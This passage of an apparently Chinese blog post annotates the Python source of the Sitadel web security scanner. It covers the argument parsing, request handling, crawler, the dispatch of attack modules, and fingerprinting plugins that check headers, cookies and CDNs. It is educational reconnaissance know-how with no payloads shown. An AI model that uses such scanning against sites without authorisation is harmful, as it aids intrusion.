class="python">if __name__ == &quot;__main__&quot;:    try:        Sitadel().main()    except KeyboardInterrupt:        sys.exit(output.Output().error(&#39;Interruption by the user, Quitting...&#39;))</code></pre><p>定义一个Sitadel类，通过parser.add_argument接受命令行参数</p><pre><code class="python">class Sitadel(object):    bn = banner.Banner()    ma = manager    url = None    def main(self):        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,                                         usage=self.bn.banner())        # 准备风险等级的可能值        risk_values = [r.value for r in Risk]        # 添加命令行参数：            #设定url选项字符串的名字url， help：参数的帮助信息        parser.add_argument(&quot;url&quot;, help=&quot;URL of the website to scan&quot;)            #设定危险等级选项字符串的名字-r或者-risk，参数可允许的值为risk_values        parser.add_argument(&quot;-r&quot;, &quot;--risk&quot;, type=int, help=&quot;Level of risk allowed for the scan&quot;,                            choices=risk_values)            #设定user-agent选项字符串的名字-ua，默认为&quot;Sitadel &quot; + 版本        parser.add_argument(&quot;-ua&quot;, &quot;--user-agent&quot;, default=&quot;Sitadel &quot; + __version__,                            help=&quot;User-agent to set for the scan requests&quot;)            #设定遵循重定向选项字符串的名字redirect  解析后的参数名称为redirect，命令行遇到参数时的动作为store_true        parser.add_argument(&quot;--redirect&quot;, dest=&#39;redirect&#39;,                            help=&quot;Whether or not the scan should follow redirection&quot;,                            action=&quot;store_true&quot;)            #设定不遵循重定向选项字符串的名字--no-redirect  解析后的参数名称为redirect        parser.add_argument(&quot;--no-redirect&quot;, dest=&#39;redirect&#39;,                            help=&quot;Whether or not the scan should follow redirection&quot;,                            action=&quot;store_false&quot;)            #设定默认遵循重定向        parser.set_defaults(redirect=True)            #设定timeout选项字符串的名字-t,类型为整形        parser.add_argument(&quot;-t&quot;, &quot;--timeout&quot;, type=int, help=&quot;Timeout to set for the scan HTTP requests&quot;)            #设定cookie选项字符串的名字-c        parser.add_argument(&quot;-c&quot;, &quot;--cookie&quot;, help=&quot;Cookie to set for the scan HTTP requests&quot;)            #设定代理选项字符串的名字-p        parser.add_argument(&quot;-p&quot;, &quot;--proxy&quot;, help=&quot;Proxy to set for the scan HTTP requests&quot;)            #设定指纹识别选项字符串的名字-f，nargs读取的指纹识别参数个数为1或多个        parser.add_argument(&quot;-f&quot;, &quot;--fingerprint&quot;, nargs=&#39;+&#39;, help=&quot;Fingerprint modules to activate&quot;)            #设定攻击选项字符串的名字-a，nargs读取的攻击方式参数个数为1或多个        parser.add_argument(&quot;-a&quot;, &quot;--attack&quot;, nargs=&#39;+&#39;, help=&quot;Attack modules to activate&quot;)            #设定配置选项字符串的名字-config，默认为config/config.yml        parser.add_argument(&quot;--config&quot;, help=&quot;Path to the config file&quot;, default=&quot;config/config.yml&quot;)             #设定verbosity选项字符串的名字--v，命令行遇到参数时的动作为存储遇到的次数，默认为0        parser.add_argument(&quot;-v&quot;, &quot;--verbosity&quot;, action=&quot;count&quot;, default=0, help=&quot;Increase output verbosity&quot;)            # 输出版本信息        parser.add_argument(&#39;--version&#39;, action=&#39;version&#39;, version=self.bn.version())        args = parser.parse_args()</code></pre><p>运行扫描必要配置</p><pre><code class="python">class Sitadel(object):    bn = banner.Banner()    ma = manager    url = None    def main(self):       ...省略...        # 验证目标URL        self.url = validator.validate_target(args.url)        # 阅读配置        settings.from_yaml(args.config)        if args.risk is not None:            settings.risk = Risk(args.risk)        # 注册服务数据、日志、输出、请求        Services.register(&quot;datastore&quot;, Datastore(settings.datastore))        Services.register(&quot;logger&quot;, logging.getLogger(&quot;sitadelLog&quot;))        Services.register(&quot;output&quot;, Output())        Services.register(&quot;request_factory&quot;,                          SingleRequest(url=self.url, agent=args.user_agent, proxy=args.proxy, redirect=args.redirect,                                  timeout=args.timeout))        # 显示目标和扫描开始时间        self.bn.preamble(self.url)        # 运行指纹识别模块        self.ma.fingerprints(args.fingerprint,                             args.user_agent,                             args.proxy,                             args.redirect,                             args.timeout,                             self.url,                             args.cookie)        # 运行爬虫程序发现URL        discovered_urls = self.ma.crawler(self.url, args.user_agent)        # 在发现的URL上运行攻击模块        self.ma.attacks(args.attack, self.url, discovered_urls)</code></pre><h2 id="0x03-lib-request-文件夹"><a href="#0x03-lib-request-文件夹" class="headerlink" title="0x03 lib/request 文件夹"></a>0x03 lib/request 文件夹</h2><pre><code>│   ├── request│   │   ├── __init__.py│   │   ├── ragent.py│   │   ├── requestfactory.py│   │   └── request.py</code></pre><p>主要是定义一些跟请求相关的方法/类/功能</p><h3 id="User-Agent：-lib-request-ragent-py"><a href="#User-Agent：-lib-request-ragent-py" class="headerlink" title="User Agent： lib/request/ragent.py"></a>User Agent： lib/request/ragent.py</h3><p>生成随机的 User-Agent。命令行选项<code>wascan.py --ragent</code>开启。</p><pre><code class="python">import random#定义随机User-Agentdef RandomUserAgent():    agents = (        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#39;,        &#39;Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16&#39;,        &#39;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0&#39;,        &#39;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1&#39;,        &#39;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)&#39;,        &#39;Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01&#39;,        &#39;Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1&#39;,        &#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;,        &#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0&#39;,        &#39;Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0)&#39;    )    #返回agents中的随机一个    return str(agents[random.randint(0, len(agents) - 1)])</code></pre><h3 id="类：lib-request-requestfactory-py"><a href="#类：lib-request-requestfactory-py" class="headerlink" title="类：lib/request/requestfactory.py"></a>类：lib/request/requestfactory.py</h3><p>定义了几种可能出现的不同协议的request：</p><pre><code class="python">class MultipleHTTPRequests:    def __init__(self, url):        self.url = urlclass SingleHTTPRequest:    passclass DNSRequest:    passclass RequestFactory:    def __init__(self):        pass    #**kwargs表示关键字参数，它是一个 dict    def make_multiple_requests(self, **kwargs):        return MultipleHTTPRequests(**kwargs)    def make_single_request(self, **kwargs):        return SingleHTTPRequest(**kwargs)    def make_dns_request(self, **kwargs):        return DNSRequest(**kwargs)</code></pre><h3 id="请求：lib-requests-request-py"><a href="#请求：lib-requests-request-py" class="headerlink" title="请求：lib/requests/request.py"></a>请求：lib/requests/request.py</h3><p>基本请求。包括请求/代理认证，请求，重定向，响应的处理。</p><pre><code class="python">class SingleRequest:    # 接受参数    def __init__(self, **kwargs):        # 获取各项值，保存到kwargs的dict中，后期进一步处理        self.url = None if &quot;url&quot; not in kwargs else kwargs[&quot;url&quot;]        self.agent = &quot;Sitadel&quot; if &quot;agent&quot; not in kwargs else kwargs[&quot;agent&quot;]        self.proxy = None if &quot;proxy&quot; not in kwargs else kwargs[&quot;proxy&quot;]        self.redirect = True if &quot;redirect&quot; not in kwargs else kwargs[&quot;redirect&quot;]        self.timeout = None if &quot;timeout&quot; not in kwargs else kwargs[&quot;timeout&quot;]        self.ruagent = ragent.RandomUserAgent()    # 发送请求    def send(self, url, method=&quot;GET&quot;, payload=None, headers=None, cookies=None):        #请求会话        output = Services.get(&#39;output&#39;)        request = Session()        prepped=self.prepare_request(url,method,payload,headers,cookies)        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)        try:            resp=request.send(                prepped,                timeout=self.timeout,                proxies={                    &#39;http&#39;: self.proxy,                    &#39;https&#39;: self.proxy,                    &#39;ftp&#39;: self.proxy,                },                allow_redirects=self.redirect,                verify=False)            return resp        except RequestException as err:            output.error(&quot;Error while trying to contact the website: \n {0}\n&quot;.format(err))            raise(err)    # 准备的请求 获取各项参数    def prepare_request(self, url, method, payload, headers, cookies):        if payload is None:            payload = {}        if headers is None:            headers = {}        if cookies is not None:            cookies = {cookies: &#39;&#39;}        if &quot;--random-agent&quot; in sys.argv:            headers[&#39;User-Agent&#39;] = self.ruagent        else:            headers[&#39;User-Agent&#39;] = self.agent        # get请求方式处理        if method.upper() == &quot;GET&quot;: # upper() 小写字母转为大写字母            req = Request(                method=method.upper(),                url=url,                headers=headers,                cookies=cookies,            ).prepare() #发送请求之前的额外处理        # post请求方式处理        elif method.upper() == &quot;POST&quot;:            req = Request(                method=method.upper(),                url=url,                data=payload,                headers=headers,                cookies=cookies,            ).prepare()        # 其他请求方式        else:            req = Request(                method=method.upper(),                url=url,                data=payload,                headers=headers,                cookies=cookies,            ).prepare()        #返回所有的req属性字典        return req</code></pre><h2 id="0x04-lib-utils-文件夹"><a href="#0x04-lib-utils-文件夹" class="headerlink" title="0x04 lib/utils 文件夹"></a>0x04 lib/utils 文件夹</h2><p>主要是定义一些小功能、小工具</p><pre><code>│   └── utils│       ├── banner.py│       ├── container.py│       ├── datastore.py│       ├── __init__.py│       ├── manager.py│       ├── output.py│       └── validator.py</code></pre><h3 id="工具显示的baner：lib-utils-banner-py"><a href="#工具显示的baner：lib-utils-banner-py" class="headerlink" title="工具显示的baner：lib/utils/banner.py"></a>工具显示的baner：lib/utils/banner.py</h3><pre><code class="python">#定义Banner类class Banner:    r = Fore.RED    y = Fore.YELLOW    ny = Fore.YELLOW    nw = Fore.WHITE    g = Fore.GREEN    e = Style.RESET_ALL    #定义banner形状和字体颜色    def banner(self):        print(self.ny + &quot;   _   _   _        ______ _                 _       _  &quot; + self.e)        print(self.ny + &quot;  | |_| |_| |      / _____|_)  _            | |     | | &quot; + self.e)        print(self.ny + &quot;  |         |     ( (____  _ _| |_ _____  __| |_____| | &quot; + self.e)        print(self.ny + &quot;  |    _    |      \____ \| (_   _|____ |/ _  | ___ | | &quot; + self.e)        print(self.ny + &quot;  |   |_|   |      _____) ) | | |_/ ___ ( (_| | ____| | &quot; + self.e)        print(self.ny + &quot;  |         |     (______/|_|  \__)_____|\____|_____)\_)&quot; + self.r + &quot; &quot; + version + &quot;\n&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; Sitadel - Web Application Security Scanner&quot; + self.g + &quot; #\\~&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; Shenril (@shenril)&quot; + self.g + &quot; #\\~&quot; + self.e)        print(self.g + &quot;~/#&quot; + self.e + &quot; https://github.com/shenril/Sitadel&quot; + self.g + &quot; #\\~&quot; + self.e)        print(&quot;\n\n&quot;)    #前言    def preamble(self, url):        print(&#39;URL: %s&#39; % url)        print(&#39;Started: %s&#39; % (time.strftime(&#39;%d/%m/%Y %H:%M:%S&#39;)))#返回以可读字符串表示的当地时间    def version(self):        return self.g + &quot;~/#&quot; + self.e + &quot; Sitadel (&quot; + version + &quot;)\n&quot;</code></pre><h3 id="container-py"><a href="#container-py" class="headerlink" title="container.py"></a>container.py</h3><p>定义Services类，获取cls、key参数</p><pre><code class="python">class Services(object):    services = {}    @classmethod    def get(cls, key):        #异常处理，如果服务是空报错        try:            if cls.services[key] is None:                raise NameError(&quot;No service registered with this name&quot;)            else:                return cls.services[key]        except KeyError:            raise NameError(&quot;No service registered with this name&quot;)    @classmethod    def register(cls, name, instance) -&gt; None:        cls.services[name] = instance</code></pre><h3 id="datastore-py"><a href="#datastore-py" class="headerlink" title="datastore.py"></a>datastore.py</h3><p>用于访问插件数据的公共文件夹的实用程序</p><pre><code class="python">import osclass Datastore:    def __init__(self, rootpath):        self.rootpath = rootpath    #python跨路径调用/lib/data/字典文件    def open(self, filename, mode):        return open(os.path.join(self.rootpath, filename), mode,encoding=&quot;utf-8&quot;)</code></pre><h3 id="manage-py"><a href="#manage-py" class="headerlink" title="manage.py"></a>manage.py</h3><pre><code class="python">#指纹识别传递参数def fingerprints(modules, agent, proxy, redirect, timeout, url, cookie):    plugins = settings.fingerprint_plugins    if modules is not None:        plugins = modules    Fingerprints(        agent=agent,        proxy=proxy,        redirect=redirect,        timeout=timeout,        url=url,        cookie=cookie    ).run(plugins)#获取爬虫urldef crawler(start_url, agent):    return crawl(start_url, agent)#调用plugins攻击执行def attacks(modules, url, crawled_urls):    plugins = settings.attack_plugins    if modules is not None:        plugins = modules    Attacks(url, crawled_urls).run(plugins)</code></pre><h3 id="output-py"><a href="#output-py" class="headerlink" title="output.py"></a>output.py</h3><p>定义了各种打印输出方法，基本的格式化字符串、颜色。略过</p><h3 id="validator-py"><a href="#validator-py" class="headerlink" title="validator.py"></a>validator.py</h3><pre><code class="python">import sysfrom urllib.parse import urlparse#验证url是否有效def validate_target(url):    try:        u = urlparse(url)        #判断协议与域名        if u.scheme and u.netloc:            return u.geturl()#geturl方法获取真实的url        else:            raise ValueError(&#39;Url not valid, please try with a valid target url!&#39;)    except ValueError as e:        print(e)        sys.exit(2)</code></pre><h2 id="0x05-lib-config"><a href="#0x05-lib-config" class="headerlink" title="0x05 lib/config"></a>0x05 lib/config</h2><h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><p>基本设置</p><pre><code class="python">import os.pathfrom enum import IntEnumimport yamlclass Risk(IntEnum):    &quot;&quot;&quot;    枚举插件的风险    0 NO_DANGER几乎没有检测到的风险    1 NOISY生成可能检测到的大量请求和模式    2危险进行开发阶段，可能对目标有潜在危害    &quot;&quot;&quot;    NO_DANGER = 0    NOISY = 1    DANGEROUS = 2#定义settings类class Settings(object):    cfg = {}    _setters = [&#39;risk&#39;, &#39;dns_resolver&#39;, &#39;datastore&#39;]    def __getattr__(self, item):        return Settings.cfg[item]    def __setattr__(self, key, value):        if key in Settings._setters:            Settings.cfg[key] = value        else:            raise NameError(&quot;You cannot redefine the value of %s dynamically\nPlease use the config file&quot; % key)    @classmethod    def from_yaml(cls, filepath):        &quot;&quot;&quot;        从yaml文件生成配置字典        ：param filepath：配置文件路径        ：return：无        &quot;&quot;&quot;        # 检查提供的文件路径是否存在        if not os.path.isfile(filepath):            raise FileNotFoundError(&quot;Invalid path for the configuration file&quot;)        # 解析配置并将其合并到dict中        with open(filepath, &#39;r&#39;) as yamlfile:            try:                # 从文件中获取配置                config = yaml.load(yamlfile)                # 合并字典并获得结果                cls.cfg = {**cls.cfg, **config}            except yaml.YAMLError as e:                print(e)</code></pre><h2 id="0x06-lib-modules"><a href="#0x06-lib-modules" class="headerlink" title="0x06 lib/modules/"></a>0x06 lib/modules/</h2><h3 id="init-py"><a href="#init-py" class="headerlink" title="__init__.py"></a><code>__init__.py</code></h3><pre><code class="python">class IPlugin(type):    def __init__(cls, name, bases, dct):        #判断cls是否不包含plugins属性        if not hasattr(cls, &#39;plugins&#39;):            # 一个基类，创建一个空注册表            cls.plugins = []        else:            # 这是派生类，将cls添加到注册表            if hasattr(cls, &#39;level&#39;) and getattr(cls, &#39;level&#39;) &lt;= settings.risk:                cls.plugins.append(cls)        #调用父类方法        super(IPlugin, cls).__init__(name, bases, dct)</code></pre><h3 id="crawler"><a href="#crawler" class="headerlink" title="crawler"></a>crawler</h3><p>爬虫，爬取页面上的所有连接。</p><pre><code>│   │   ├── crawler│   │   │   ├── crawler.py│   │   │   └── __init__.py</code></pre><h4 id="爬虫：lib-crawler-crawler-py"><a href="#爬虫：lib-crawler-crawler-py" class="headerlink" title="爬虫：lib/crawler/crawler.py"></a>爬虫：lib/crawler/crawler.py</h4><pre><code class="python">urls = []#爬虫类SitadelSpider，它继承自CrawlSpider类class SitadelSpider(CrawlSpider):    name = &quot;sitadel&quot;    #定义规则    rules = [        Rule(            LinkExtractor(                canonicalize=True,                unique=True            ),            follow=True,            callback=&quot;parse_items&quot;        )    ]    # 解析项目的方法    def parse_items(self, response):        links = LinkExtractor(canonicalize=True, unique=True).extract_links(response)        # 对于links中的所有链接        for link in links:            #对于允许的域名allowed_domains中所有的域名            for allowed_domain in self.allowed_domains:                #判断拆分url的netloc是否等于所允许的域名                if urlparse(link.url).netloc == allowed_domain:                    urls.append(link.url)                    #yield 是一个类似 return的关键字，迭代一次遇到yield时就返回yield后面爬虫下来的url                    yield scrapy.Request(link.url, callback=self.parse)#定义crawl函数，传入url和user-agentdef crawl(url, user_agent):    output = Services.get(&#39;output&#39;)    # 爬虫工具的设置    settings = get_project_settings()    settings.set(&quot;USER_AGENT&quot;, user_agent)    settings.set(&quot;LOG_LEVEL&quot;, &quot;CRITICAL&quot;)    # 创建将执行爬虫的进程    output.info(&#39;Start crawling the target website&#39;)    process = CrawlerProcess(settings)    domain = urlparse(url).hostname    process.crawl(SitadelSpider, start_urls=[str(url)], allowed_domains=[str(domain)])    process.start()    # 清理结果    clean_urls = []    for u in urls:        try:            new_url = urlparse(u).geturl()            if new_url not in clean_urls:                clean_urls.append(new_url)        except ValueError:            continue    return clean_urls</code></pre><h2 id="0x07-lib-modules-fingerprints"><a href="#0x07-lib-modules-fingerprints" class="headerlink" title="0x07 lib/modules/fingerprints"></a>0x07 lib/modules/fingerprints</h2><p>指纹识别模式</p><p>目前针对Web应用指纹识别的研究工作主要通过对大量HTML数据的分析来识别Web应用, 包括HTML源码关键字和特殊文件及路径, 由于需要处理较多HTML数据和文件, 降低了其执行速度; 而主流工具主要利用HTML源码关键字实现Web应用的快速识别, 但是由于关键字易被删除而导致识别率低.</p><p>为解决Web应用指纹识别的研究工作与实际应用中存在的上述问题, 并提高Web应用的识别率, 本文以主流的开源Web应用[<a href="http://html.rhhz.net/ZGKXYDXXB/20160516.htm#b15" target="_blank" rel="external">15</a>]为研究对象, 以源码审计为研究方法, 通过对Web应用的静态文件、源码以及结构设计的详细分析, 并从以下4个方面选取Web应用指纹.</p><p>1)结构特征. Web应用的类型可由其特殊的结构设计准确识别, 该指纹只需从HTML数据的头部获取. 例如, 如果Web应用的文件路径包含/wp-includes/, 则该Web应用是Wordpress.</p><p>2)静态文件. Web应用的类型及版本可由其未被修改而被直接使用的静态文件准确识别. 例如, 用于Web应用前端布局的文件style.css, 通过与目标style.css比较可准确识别Web应用的类型及版本.</p><p>3)Cookie设计. Web应用的类型可由开发者为其设计特殊的Cookie名准确识别. 例如, 如果Cookie名为django, 则该Web应用是Django-CMS.</p><p>4)关键字. HTML源码关键字是主流工具选取的Web应用指纹, 存在与功能无关且易被删除的缺点, 但可作为Web应用的补充指纹. 通过对关键字在HTML源码中的分析, 选取以下4个关键字指纹:</p><pre><code>·&lt;meta name=&quot;generator&quot; content=&quot;*application*&quot; /&gt;·Powered by *application*·&lt;meta name=&quot;author&quot; content=&quot;*author*&quot; /&gt;·&lt;meta name=&quot;copyright&quot; content=&quot;*copyright*&quot; /&gt;</code></pre><p>其中, 结构特征、静态文件和Cookie设计这3类指纹都与Web应用功能相关, 有不易被修改或删除的特点, 我们设计并构建了包含这4类Web应用指纹的Web指纹库, 只需按照Web指纹库定义的格式向其中增加新类型Web指纹, 即可实现对新增Web应用的识别, 对Web应用的识别具有良好的可扩展性.</p><h3 id="init-py-1"><a href="#init-py-1" class="headerlink" title="_init_.py"></a><code>_init_.py</code></h3><p><code>_init_.py</code>代码中<code>Fingerprint</code>类如下：</p><pre><code class="python">class FingerprintPlugin(metaclass=IPlugin):    #指纹模块的默认风险等级为NO DANGER，因为它仅分析一个请求响应    level = Risk.NO_DANGER    def process(self, headers, content):        raise NotImplementedError(str(self) + &quot;: Process method not found&quot;)    def __repr__(self):        parent_module = self.__class__.__module__.split(&#39;.&#39;)[-2]        return parent_module.title()class Fingerprints:    def __init__(self, agent, proxy, redirect, timeout, url, cookie):        # 相关参数 初始化        self.url = url        self.cookie = cookie        self.output = Services.get(&#39;output&#39;)        self.request = Services.get(&#39;request_factory&#39;)    def run(self, plugins_activated):        self.output.info(&#39;Launching fingerprints modules...&#39;)        # 从配置中注册插件        for p in plugins_activated:            #            currentdir = os.path.dirname(os.path.realpath(__file__))            pkgpath = os.path.dirname(currentdir + &quot;/%s/&quot; % p)            modules = [name for _, name, _ in pkgutil.iter_modules([pkgpath])]            for module in modules:                importlib.import_module(&quot;.{pkg}.{mod}&quot;.format(pkg=p, mod=module), __package__)        try:            # 发送侦听请求            # 首先发送HTTP GET请求            resp = self.request.send(                url=self.url,                method=&quot;GET&quot;,                payload=None,                headers=None,                cookies=self.cookie            )            # 循环遍历将结果传递到指纹模块上进行处理            fingerprints = (                [(p(), p().process(resp.headers, resp.text)) for p in FingerprintPlugin.plugins])            # 显示每个模块类别的结果            for category, result in fingerprints:                if result is not None:                    self.output.finding(&#39;{category} detected: {result}&#39;.format(category=category, result=result))        except Exception as e:            self.output.error(&quot;Error occured\nAborting fingerprint...\n&quot;)            return</code></pre><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><p>指纹识别模式服务开启 ，代码重点server类如下</p><pre><code class="python">#定义Server类 传入指纹识别插件class Server(FingerprintPlugin):    def process(self, headers, content):        server = None        try:            for item in headers.items():                if re.search(r&#39;server&#39;, item[0], re.I):                    server = item[1]            # FIXME修复对请求URL的访问            # if server is None:            #     resp = Request().send(Request().url, headers={&#39;Expect&#39;: &#39;Linguini&#39;})            #     for item in resp.headers.items():            #         if re.search(r&#39;server&#39;, item[0], re.I): server = item[1]            return server        except Exception as e:            print(e)</code></pre><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><h4 id="cookie-py"><a href="#cookie-py" class="headerlink" title="cookie.py"></a>cookie.py</h4><pre><code class="python">class Cookie(FingerprintPlugin):    def process(self, headers, content):        #如果被测url的header存在set-cookie，那么取过来放在cookie变量中        if &#39;set-cookie&#39; in headers:            cookie = headers[&#39;set-cookie&#39;]        else:            cookie = None        #如果cookie不为空        if cookie is not None:            #如果cookie中存在domain=*，输出cookie中匹配到的domain=(.+?)[\;]            if re.search(r&#39;domain=\S*&#39;, cookie, re.I):                Output().finding(                    &#39;Cookies are only accessible to this domain: %s&#39; % re.findall(r&#39;domain=(.+?)[\;]&#39;, cookie, re.I)[0])            #如果在cookie中未找到httponly则提示cookie创建时没有使用hhtponly技术            if not re.search(&#39;httponly&#39;, cookie, re.I):                Output().finding(&#39;Cookies created without HTTPOnly Flag.&#39;)            if not re.search(&#39;secure&#39;, cookie, re.I):                Output().finding(&#39;Cookies created without Secure Flag.&#39;)</code></pre><h4 id="headers-py"><a href="#headers-py" class="headerlink" title="headers.py"></a>headers.py</h4><pre><code class="python">#定义header类，传入指纹识别插件的参数class Headers(FingerprintPlugin):      #定义process函数    def process(self, headers, content):      #将各个请求header头字典作为list存入fields参数        fields = (&#39;Accept&#39;,                  &#39;Accept-Charset&#39;,                  &#39;Accept-Encoding&#39;,                  略。。。。。。                  &#39;X-UA-Compatible&#39;                  )        #如何在headers的key中找到X-Frame-Options则输出提示        if not re.search(r&#39;X-Frame-Options&#39;, str(headers.keys()), re.I):            Output().finding(&#39;X-Frame-Options header is not present.&#39;)        if not re.search(r&#39;Strict-Transport-Security&#39;, str(headers.keys()), re.I):            Output().finding(&#39;Strict-Transport-Security header is not present.&#39;)        if not re.search(r&#39;x-xss-protection&#39;, str(headers.keys()), re.I):            Output().finding(&#39;X-XSS-Protection header is not present.&#39;)        try:            #循环遍历key 如果实际情况key都不在扫描器存储的字典key中，则输出提示不在文件中            for key in headers.keys():                if key not in fields:                    Output().finding(&#39;Uncommon header &quot;%s&quot; found, with contents: %s&#39; % (key, headers[key]))        except Exception as e:            print(e)</code></pre><h3 id="cdn指纹识别"><a href="#cdn指纹识别" class="headerlink" title="cdn指纹识别"></a>cdn指纹识别</h3><h4 id="cdn基础"><a href="#cdn基础" class="headerlink" title="cdn基础"></a>cdn基础</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190223145924.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190223150037.png" alt=""></p><p>接下来我们通过图解来看一下当访问<a href="http://www.apple.com/" target="_blank" rel="external">http://www.apple.com</a>  时，apple主页通过CDN获取html页面的全过程</p><p><img src="http://static.oschina.net/uploads/space/2014/0408/223609_7o3z_1452390.png" alt="img"></p><p>(1) 用户向电信运营商的本地DNS递归查询服务器（以下简称local telcom DNS）询问 <a href="http://www.apple.com/" target="_blank" rel="external">www.apple.com</a>  的ip地址。</p><p>(2,3) local telcom DNS向根域名服务器和.com顶级域名服务器进行递归查询apple.com的权威域名服务器地址。</p><p>(4,5) local telcom DNS向apple.com权威域名服务器查询<a href="http://www.apple.xn--comip%2Cakamaicname:e3191-3y32bu50azz7espbb62cuf3kna9319n.dscc.akamaiedge.net/" target="_blank" rel="external">www.apple.com</a> 的ip，得到指向Akamai域名的CNAME记录：<a href="http://www.isg-apple.com.akadns.net/" target="_blank" rel="external">www.isg-apple.com.akadns.net</a>，该域名由Akamai拥有。接着local telcom DNS向<a href="http://www.isg-apple.com.akadns.net/" target="_blank" rel="external">www.isg-apple.com.akadns.net</a>发起DNS查询请求，得到另一个CNAME记录 <a href="http://www.apple.com.edgekey.net/" target="_blank" rel="external">www.apple.com.edgekey.net</a> ，该域名同样由Akamai拥有。和上一步一样，接着local telcom DNS向<a href="http://www.apple.com.edgekey.net/" target="_blank" rel="external">www.apple.com.edgekey.net</a> 发起域名查询请求，得到另一个CNAME记录 <a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> ,该域名还是由Akamai拥有（akadns.net, edgekey, akamaiedge.net 都是Akamai控制的域名）。（由上面的dig截图我们知道，<a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> 是最后一次CNAME记录的域名，也是akamai的智能DNS服务器，它能根据用户所处的地理位置和当前网络负载情况给出最合适的服务器ip地址。）</p><p>(6,7) local telcom DNS向根域名服务器和.net顶级域名服务器进行递归查询akamaiedge.net的权威域名服务器地址。</p><p>(8,9) lcoal telcom DNS向akamaiedge.net的权威域名服务器查询<a href="http://www.dscc.akamaiedge.net/" target="_blank" rel="external">e3191.dscc.akamaiedge.net</a> 的ip,  得到的返回结果为Akamai CDN edge server的ip，一般是离用户地理位置最近的那个edge server服务器。</p><p>(10) local telcom DNS将Akamai CDN edge server的ip返回给用户的计算机。</p><p>(11) 用户向Akamai CDN edge server发送请求。</p><p>(12) Akamai CDN edge server会进行判断：如果是静态资源请求且缓存已经过期，或者是动态资源请求，会向apple源服务器发送请求，否则直接转到（13）。</p><p>(13) Akamai CDN edge server将缓存的静态资源或者作为代理转发的动态资源返回给用户。</p><p>我们平时看到的对CDN的使用基本就是按照上图的流程来进行的。</p><h4 id="akamai"><a href="#akamai" class="headerlink" title="akamai"></a>akamai</h4><p> 域名拼接上edgekey.net(akamai独有)，如果A记录存在，A记录解析成功，说明这个域名存在有CDN，若不存在则无cdn。</p><pre><code class="python">from urllib.parse import urlparsefrom dns.resolver import NXDOMAIN, NoAnswer, Resolver, Timeoutfrom lib.config import settingsfrom lib.config.settings import Riskfrom lib.modules.fingerprints import FingerprintPluginfrom lib.utils.container import Services#定义Akamai类class Akamai(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            #dns询问指定查询类型为A记录             dns_query = resolver.query(hostname + &quot;.edgekey.net&quot;, &#39;A&#39;)            #域名解析正确且至少要返回一个IP，则判断是Akamai CDN            if len(dns_query) &gt; 0:                return &quot;Akamai CDN&quot;        except NXDOMAIN:            pass        except NoAnswer:            pass        except Timeout:            pass</code></pre><h4 id="azure-py"><a href="#azure-py" class="headerlink" title="azure.py"></a>azure.py</h4><p>DNS解析CNAME 记录的查询是否存在<code>azureedge.net</code></p><pre><code class="python">class Azure(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                for answer in dns_query:                    #扫描answer字符串中azureedge.net，r代表了原字符串不用加转义字符，re.I 忽略大小写                     #search是在整体搜索，而match是从开始搜索                    _ |= re.search(r&#39;azureedge\.net&#39;, str(answer), re.I) is not None            #如果成功判断是Azure  cdn            if _:                return &quot;Azure CDN&quot;        except NoAnswer:            pass        except NXDOMAIN:            pass        except Timeout:            pass</code></pre><h4 id="cloudflare-py"><a href="#cloudflare-py" class="headerlink" title="cloudflare.py"></a>cloudflare.py</h4><p> 域名拼接上.cdn.cloudflare.net(cloudflare独有)，如果A记录存在，A记录解析成功，说明这个域名存在有cloudflare CDN</p><pre><code class="python">class Cloudflare(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        try:            